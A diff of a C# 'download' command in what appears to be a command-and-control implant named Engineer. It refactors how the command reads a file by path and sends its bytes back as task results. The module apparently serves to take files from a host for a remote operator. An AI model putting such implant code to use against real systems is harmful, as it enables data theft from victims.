@@ -1,11 +1,8 @@
-﻿using Engineer.Functions;
-using Engineer.Models;
-using System;
-using System.Collections.Generic;
+﻿using System;
 using System.IO;
-using System.Linq;
-using System.Text;
 using System.Threading.Tasks;
+using DynamicEngLoading;
+
 
 namespace Engineer.Commands
 {
@@ -17,18 +14,20 @@ namespace Engineer.Commands
         {
             try
             {
-
                 //read file from file string as a byte array and return it
                 if (task.Arguments.TryGetValue("/file", out string file))
                 {
                     byte[] content = File.ReadAllBytes(file);
-                    Tasking.FillTaskResults(Convert.ToBase64String(content),task, EngTaskStatus.Complete,TaskResponseType.String);
+                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(content, task, EngTaskStatus.Complete, TaskResponseType.FilePart);
                 }
-                Tasking.FillTaskResults("missing /file argument for download target",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
+                else
+                {
+                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("missing /file argument for download target", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
+                }
             }
             catch (Exception ex)
             {
-                Tasking.FillTaskResults("error: " + ex.Message,task,EngTaskStatus.Failed,TaskResponseType.String);
+                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + ex.Message,task,EngTaskStatus.Failed,TaskResponseType.String);
             }
 
         }
